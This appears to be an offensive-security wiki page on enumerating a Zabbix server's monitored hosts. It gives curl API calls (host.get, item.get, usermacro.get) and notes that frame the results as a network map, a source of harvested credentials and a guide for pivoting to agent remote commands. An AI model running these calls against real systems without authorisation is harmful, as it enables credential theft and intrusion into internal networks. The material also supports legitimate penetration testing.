---
title: "Host: the Zabbix monitored-host inventory"
description: "host.get and the Hosts page list every system Zabbix monitors, with hostnames, IP and DNS interfaces, and the templates and items attached. This is a map of the internal estate, the addresses and services Zabbix reaches, and the items and macros frequently carry the credentials used to monitor each host, turning the inventory into both reconnaissance and a credential source."
keywords:
  - zabbix hosts
  - host.get
  - interfaces
  - macros
  - inventory
---

# Host

The monitored-host inventory is one of Zabbix's most valuable disclosures. `host.get` (and the Data collection > Hosts page) lists every system Zabbix watches, each with its configured interfaces (Agent, SNMP, IPMI, JMX) and their IP/DNS addresses, the templates and items attached, and the host inventory fields. That is a ready-made map of the internal estate: the hosts that matter enough to monitor, their addresses, and which services (SNMP, IPMI, agent, database) Zabbix connects to on each. Crucially, the items and the host/template macros often contain the credentials Zabbix uses to monitor those hosts, so enumerating hosts and their macros harvests both the network map and the credentials to act on it.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# hosts with their interface addresses (the estate map)
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"host.get","params":{"output":["host","name"],"selectInterfaces":["type","ip","dns","port"]},"auth":"'"$TOK"'","id":1}'
# items and macros frequently hold the monitoring credentials
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"item.get","params":{"output":["name","key_"],"search":{"key_":"ssh"}},"auth":"'"$TOK"'","id":1}'
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"usermacro.get","params":{"output":"extend"},"auth":"'"$TOK"'","id":1}'
```

## Exploitation notes

- The interface list maps the estate and shows which services Zabbix reaches per host (SNMP, IPMI, agent, JMX), guiding where to pivot and what credentials to seek.
- Macros ({$SNMP_COMMUNITY}, {$SSH_PASSWORD}, database and API secrets) stored at host and template level routinely hold the real credentials; `usermacro.get` and secret-type macro handling are the credential harvest, see [Credential harvesting on similar platforms](../../librenms-and-observium/credential-harvesting.md) for the general pattern.
- Hosts with an Agent interface are candidates for [agent remote commands](../code-execution/agent-remote-commands.md); hosts with SNMP/IPMI interfaces expose those credentials.
- Requires an authenticated session; the inventory plus macros is often the biggest single prize from a Zabbix compromise, even before code execution.

## References

- [Zabbix API: host.get](https://www.zabbix.com/documentation/current/en/manual/api/reference/host/get)
- [HackTricks: Zabbix](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
